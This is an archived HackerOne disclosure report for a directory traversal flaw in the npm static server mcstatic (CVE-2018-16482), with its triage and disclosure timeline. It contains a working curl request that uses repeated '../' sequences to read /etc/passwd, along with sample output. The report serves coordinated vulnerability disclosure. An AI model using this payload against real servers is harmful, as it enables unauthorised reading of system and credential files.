---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/node
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2018-06-12
submitted: 2018-03-27T09:25:33.344Z
bounty_usd: null
votes: 7
cve: "CVE-2018-16482"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "tungpun"
source: "https://hackerone.com/reports/330285"
title: "[mcstatic] Server Directory Traversal"
---
# [mcstatic] Server Directory Traversal

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 7 | **Program:** Node.js third-party modules | **Disclosed:** 2018-06-12

- Report: [https://hackerone.com/reports/330285](https://hackerone.com/reports/330285)
- CWE: Path Traversal | CVE: CVE-2018-16482
- Submitted: 2018-03-27T09:25:33.344Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a Server Directory Traversal in **mcstatic**.
It allows reading local files on the target server.

# Module

**module name:** mcstatic
**version:** 0.0.20
**npm page:** `https://www.npmjs.com/package/mcstatic`

## Module Description

Static Http server for mocking and stuff

# Vulnerability

## Steps To Reproduce:

* Install the module

`$ npm i mcstatic`

* Start the server

`$ ./node_modules/mcstatic/bin/mcstatic --port 6060`

* Using the below request to access the file `/etc/passwd` on the target server:

```
$ curl --path-as-is 'http://127.0.0.1:6060/../../../../../../../../../etc/passwd'
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
...
```

## Supporting Material/References:

* node v8.10.0
* npm 5.6.0
* curl 7.54.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

reading local files on the target server

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **Report Triaged**
- **2018-04-08** @dagonza: I can confirm this vulnerability. I am inviting the owner to discuss about it. Thanks @tungpun for such detailed report.
- **2018-05-14** @tungpun: I think your 45 days SLA has been reached! May I kindly know any update?
- **Report Resolved**
- **2018-05-14** @tungpun: Thanks for your kind co-operation!
Currently, I am looking forward to the CVE for these reports as the commitment.
- **2018-06-12** @dagonza: Hi @tungpun CVE assignment is a slow process. We will disclose the report unrelated to the CVE assignment and assign it further down the line but I am afraid we cannot commit right now to a timeframe for the CVE.
- **Report Severity Updated**
- **2018-06-12** @tungpun: Okay. Please kindly let me know if you have any update!
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2018-12-28** @dagonza: @tungpun CVEs should start flowing soon. Some where stuck in the process but they have been actioned. Thanks and sorry for the delay...
